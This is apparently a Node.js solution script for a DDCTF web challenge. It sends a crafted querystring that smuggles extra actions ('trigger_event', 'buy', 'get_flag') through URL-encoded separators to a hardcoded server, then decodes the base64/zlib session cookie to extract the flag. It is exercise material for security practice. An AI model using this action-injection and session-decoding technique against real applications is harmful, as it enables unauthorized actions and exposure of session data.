const got = require('got')
const { CookieJar } = require('tough-cookie')
const zlib = require('zlib')
const flatten = require('just-flatten-it')
const { base64 } = require('../common/utils')

async function fetch (querystring) {
  const jar = new CookieJar()
  const url = `http://116.85.48.107:5002/d5af31f66147e857/?${querystring}`
  const response = await got(url, {
    cookieJar: jar,
  })
  console.log('Response\n', response.body)
  return jar
}

/**
 * https://www.leavesongs.com/PENETRATION/client-session-security.html
 */
function decrypt (session) {
  let buf = Buffer.from(session.split('.')[1], 'base64')
  return JSON.parse(zlib.unzipSync(buf).toString())
}

function readLogs (payload) {
  return flatten(payload.log).map((log) => base64.decode(log[' b']))
}

async function main () {
  try {
    // test querystring via ./repeater.py
    let querystring = 'action:trigger_event%23;action:buy;999%23action:get_flag;'
    let jar = await fetch(querystring)
    let session = jar.toJSON().cookies.find(({ key }) => key === 'session').value
    let payload = decrypt(session)
    let logs = readLogs(payload)
    console.log(payload, logs)
    console.log('FLAG: \n', `DDCTF{${logs[5].slice('func:show_flag;'.length)}}`)
  } catch (error) {
    console.error(`Error: ${error.message}`)
  }
}

main()
